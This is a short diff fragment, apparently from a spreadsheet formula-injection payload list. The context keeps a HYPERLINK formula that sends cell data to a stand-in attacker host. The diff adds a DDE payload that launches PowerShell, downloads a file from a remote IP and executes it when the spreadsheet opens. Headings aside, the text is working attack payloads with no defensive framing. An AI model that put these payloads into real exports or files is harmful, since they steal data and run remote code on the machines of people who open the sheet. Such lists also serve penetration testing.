@@ -30,3 +30,6 @@ Use Hyperlink formula to send data to attacking server
 =HYPERLINK("http://www.attacker.com?leak="&C2&D2,"Please click for further information")
 
 
+Execute content when the spreadsheet loads
+------------------------------------------------
+=cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://10.5.21.24/index.jpeg;Start-Process index.jpeg'!A0
